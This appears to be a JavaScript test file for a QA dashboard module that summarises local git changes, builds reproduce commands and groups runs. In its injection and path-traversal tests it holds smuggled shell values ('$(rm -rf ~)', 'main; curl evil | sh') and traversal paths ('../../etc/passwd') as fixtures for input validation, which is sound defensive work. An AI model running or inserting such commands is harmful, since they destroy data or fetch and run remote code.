/**
 * What local runs recorded about their code: wording, grouping, saved files.
 * Run with: cd webapp && npm test -- localChanges
 */
import {
  changes_lines, changes_sentence, download_name, fetch_capped_text, git_commands, group_local_changes, index_patch, omitted_message,
  patch_url, restore_command, state_key, unpushed_commit, unpushed_text,
} from '../localChanges';
import { filter_batch } from '../../../utils';
import { language } from '../../../viewers/text';
import { is_patch } from '../../../viewers/fileTypes';

const changes = (more = {}) => ({
  level: 'patch', scope: 'run', dirty: true, head: '3f2a1b9c0d1e2f30', branch: 'feature/x', upstream: 'origin/feature/x',
  files: [{ path: 'src/a.py', status: 'M', added: 30, deleted: 10 }, { path: 'src/b.py', status: 'A', added: 10, deleted: 0 }, { path: 'img.png', status: 'M', added: null, deleted: null, binary: true }],
  files_total: 3, added: 40, deleted: 12, sha256: 'aaa', patch: { path: '.qaboard/local-changes.patch', bytes: 1234 },
  ...more,
});
const run = (id, local_changes) => ({ id, test_input_path: `in${id}.raw`, output_dir_url: `/s/${id}`, data: local_changes === undefined ? {} : { local_changes } });

describe('wording', () => {
  it('counts lines and files', () => {
    expect(changes_lines(changes())).toBe('+40 −12');
    expect(changes_sentence(changes({ files_total: 1, added: 1, deleted: 0 }))).toBe('1 file, +1 −0');
    expect(changes_sentence(changes())).toBe('3 files, +40 −12');
  });

  it('says unpushed commits only when known', () => {
    expect(unpushed_text(changes())).toBe('');
    expect(unpushed_text(changes({ pushed: true, unpushed_commits: 0 }))).toBe('');
    expect(unpushed_text(changes({ pushed: false, unpushed_commits: 2 }))).toBe('2 unpushed commits');
    expect(unpushed_text(changes({ pushed: false, unpushed_commits: 1 }))).toBe('1 unpushed commit');
  });

  it('explains why a patch is missing', () => {
    expect(omitted_message({ path: 'x' })).toBeNull();
    expect(omitted_message({ omitted: 'too_large', bytes: 3 * 1024 * 1024 })).toBe('The patch is 3072 KB: too large to save (outputs.local_changes.max_patch_kb).');
    expect(omitted_message({ omitted: 'level' })).toBe('This server keeps only a summary of the code changes.');
    expect(omitted_message({ omitted: 'timeout' })).toBe('git took too long to compute the patch (outputs.local_changes.timeout, qa doctor).');
    expect(omitted_message({ omitted: 'unreadable' })).toBe("The patch the batch saved couldn't be read on the machine that ran this run.");
    expect(omitted_message({ omitted: 'error' })).toBe("The patch couldn't be saved.");
    expect(omitted_message({ omitted: 'no_answer' })).toBe("The server didn't answer when the run started: the patch wasn't saved.");
  });

  it('says how to reproduce with git, from the patches saved', () => {
    expect(git_commands(changes())).toEqual(['git checkout 3f2a1b9c0d1e2f30 && git apply local-changes.patch']);
    // named like the downloads
    expect(git_commands(changes(), { id: 12 })).toEqual(['git checkout 3f2a1b9c0d1e2f30 && git apply run-12-local-changes.patch']);
    expect(download_name({ id: 12 }, 'unpushed')).toBe('run-12-unpushed.patch');
    expect(download_name({ id: 'x;y' })).toBe('local-changes.patch');
    const unpushed = { base: 'bbbbbbbb', pushed: false, unpushed: { path: '.qaboard/unpushed.patch', bytes: 10, sha256: 'u' } };
    expect(git_commands(changes(unpushed))).toEqual([
      'git checkout 3f2a1b9c0d1e2f30 && git apply local-changes.patch',
      'git checkout bbbbbbbb && git apply unpushed.patch && git apply local-changes.patch',
    ]);
    // only what's saved
    expect(git_commands(changes({ ...unpushed, patch: { omitted: 'level' } }))).toEqual(['git checkout bbbbbbbb && git apply unpushed.patch']);
    expect(git_commands(changes({ patch: { omitted: 'too_large' } }))).toEqual([]);
    expect(git_commands(changes({ head: undefined }))).toEqual([]);
  });

  it('never puts what runs sent in commands, unless it is a sha or an id', () => {
    expect(git_commands(changes({ head: '$(rm -rf ~)' }))).toEqual([]);
    expect(git_commands(changes({ base: 'main; curl evil | sh', pushed: false, unpushed: { path: '.qaboard/unpushed.patch' } }))).toEqual(['git checkout 3f2a1b9c0d1e2f30 && git apply local-changes.patch']);
    expect(git_commands(changes({ head: 'ABCDEF12 && x' }))).toEqual([]);
    expect(restore_command({ id: 12 })).toBe('qa restore 12');
    expect(restore_command({ id: '12' })).toBe('qa restore 12');
    expect(restore_command({ id: '12; rm -rf ~' })).toBeNull();
    expect(restore_command({})).toBeNull();
  });
});

describe('saved files', () => {
  it('only links to files inside the run', () => {
    expect(patch_url(run(1), changes())).toBe('/s/1/.qaboard/local-changes.patch');
    for (const path of ['../../etc/passwd', '/etc/passwd', 'https://evil.example/x', 'a//b', 'a\\b', ''])
      expect(patch_url(run(1), changes({ patch: { path } }))).toBeNull();
    expect(patch_url(run(1), changes({ patch: { omitted: 'level' } }))).toBeNull();
  });
});

describe('group_local_changes', () => {
  it('groups runs by the content of their changes', () => {
    const outputs = [run(1, changes()), run(2, changes()), run(3, changes({ sha256: 'bbb' })), run(4, changes({ dirty: false })), run(5, changes({ dirty: null })), run(6)];
    const { groups, missing, shared, has_data } = group_local_changes(outputs);
    expect(has_data).toBe(true);
    expect(missing).toBe(1);
    expect(shared).toBeNull();
    expect(groups.map(g => [g.kind, g.count])).toEqual([['changes', 2], ['changes', 1], ['clean', 1], ['unknown', 1]]);
    expect(groups[0].outputs.map(o => o.id)).toEqual([1, 2]);
  });

  it('says when all the runs share one state', () => {
    expect(group_local_changes([run(1, changes()), run(2, changes())]).shared).toBe('3f2a1b9c0d1e2f30:aaa');
    expect(group_local_changes([run(1, changes({ dirty: false })), run(2, changes({ dirty: false }))]).shared).toBe('3f2a1b9c0d1e2f30:clean');
    // the commit and the unpushed commits are part of the state
    expect(state_key(changes({ pushed: false, unpushed: { sha256: 'u1' } })).key).not.toBe(state_key(changes({ pushed: false, unpushed: { sha256: 'u2' } })).key);
    expect(group_local_changes([run(1, changes()), run(2, changes({ head: '0000000000000000' }))]).groups).toHaveLength(2);
  });

  it("doesn't call runs the same when it can't tell", () => {
    // summary only: no content address, even with the same counts
    const summary = changes({ sha256: undefined, patch: { omitted: 'level' } });
    const two = group_local_changes([run(1, summary), run(2, summary)]);
    expect(two.groups).toHaveLength(2);
    expect(two.shared).toBeNull();
    const one = group_local_changes([run(1, summary)]);
    expect(one).toMatchObject({ single: true, shared: null });
    // unknown runs are listed together, but not shared
    expect(group_local_changes([run(1, changes({ dirty: null })), run(2, changes({ dirty: null }))])).toMatchObject({ single: true, shared: null });
    // nor a commit that isn't a sha
    expect(group_local_changes([run(1, changes({ head: 'main' })), run(2, changes({ head: 'main' }))]).shared).toBeNull();
    expect(group_local_changes([run(1), run(2)])).toMatchObject({ has_data: false, shared: null });
  });

  it('groups many runs', () => {
    const outputs = Array.from({ length: 20000 }, (_, i) => run(i, changes({ sha256: `${i % 7}` })));
    expect(group_local_changes(outputs).groups.map(g => g.count).reduce((a, b) => a + b)).toBe(20000);
  });

  it('finds unpushed commits', () => {
    expect(unpushed_commit([run(1, changes()), run(2, changes({ pushed: false, base: 'bbbbbbbb' }))])).toEqual({ sha: '3f2a1b9c0d1e2f30', base: 'bbbbbbbb' });
    expect(unpushed_commit([run(1, changes({ pushed: false, head: 'x; y', base: 'main' }))])).toEqual({ sha: null, base: null });
    expect(unpushed_commit([run(1, changes({ pushed: true }))])).toBeNull();
  });
});

describe('index_patch', () => {
  it('finds where each file starts', () => {
    const text = 'diff --git a/src/a.py b/src/a.py\nindex 1..2\n--- a/src/a.py\n+++ b/src/a.py\n@@ -1 +1 @@\n-a\n+b\ndiff --git a/new.txt b/new.txt\n+x\n';
    const { lines, files } = index_patch(text);
    expect(lines).toBe(10);
    expect(files.get('src/a.py')).toBe(1);
    expect(files.get('new.txt')).toBe(8);
    expect(index_patch(undefined).files.size).toBe(0);
    // paths with " b/" in them, and CRLF
    const tricky = index_patch('diff --git a/x b/y.txt b/x b/y.txt\r\n+1\r\n');
    expect([...tricky.files.keys()]).toEqual(['x b/y.txt']);
    // the lines hunks add and remove, not the headers
    const hunks = index_patch('diff --git a/a b/a\n--- a/a\n+++ b/a\n@@ -1,2 +1,2 @@\n-old\n+new\n same\n');
    expect(hunks).toMatchObject({ headers: [1], deleted: [5], inserted: [6] });
  });
});

describe('fetch_capped_text', () => {
  afterEach(() => vi.unstubAllGlobals());
  it('reads patches up to a size, whatever the run said', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response('x'.repeat(1000))));
    expect(await fetch_capped_text('/p', 2000)).toEqual({ text: 'x'.repeat(1000) });
    expect(await fetch_capped_text('/p', 500)).toMatchObject({ too_large: true });
    vi.stubGlobal('fetch', vi.fn(async () => new Response('x', { headers: { 'Content-Length': '99999999' } })));
    expect(await fetch_capped_text('/p', 500)).toEqual({ too_large: true, bytes: 99999999 });
    vi.stubGlobal('fetch', vi.fn(async () => new Response('no', { status: 404, statusText: 'NOT FOUND' })));
    await expect(fetch_capped_text('/p', 500)).rejects.toThrow('404');
  });
});

describe('the run filter', () => {
  const batch = { outputs: { 1: run(1, changes()), 2: run(2, changes({ dirty: false })), 3: run(3), 4: run(4, changes({ dirty: null })) } };
  it('keeps runs with or without local changes', () => {
    expect(filter_batch(batch, 'changes:local').outputs).toEqual(['1']);
    expect(filter_batch(batch, 'changes:none').outputs).toEqual(['2']);
    expect(filter_batch(batch, 'changes:unknown').outputs).toEqual(['4']);
    expect(filter_batch(batch, '-changes:local').outputs).toEqual(['2', '3', '4']);
  });
});

describe('file viewers', () => {
  it('highlight patches as diffs', () => {
    expect(is_patch('.qaboard/local-changes.patch')).toBe(true);
    expect(language('fix.diff')).toBe('diff');
    expect(language('local-changes.patch')).toBe('diff');
    expect(language('config.yaml')).toBe('yaml');
    expect(language('log.txt')).toBe('plaintext');
  });
});


describe('redo_local_note', () => {
  it('says which runs would be redone without their local changes', async () => {
    const { redo_local_note, ran_local_changes } = await import('../localChanges');
    const dirty = { data: { local_changes: { dirty: true } } };
    const unpushed = { data: { local_changes: { dirty: false, pushed: false } } };
    const clean = { data: { local_changes: { dirty: false, pushed: true } } };
    expect([dirty, unpushed, clean, {}].map(ran_local_changes)).toEqual([true, true, false, false]);
    expect(redo_local_note([clean, {}])).toBeNull();
    expect(redo_local_note([dirty])).toMatch(/^This run ran local changes/);
    expect(redo_local_note([dirty, unpushed])).toMatch(/^These runs ran local changes/);
    expect(redo_local_note([dirty, clean, {}])).toMatch(/^1 of these 3 runs ran local changes/);
  });
});
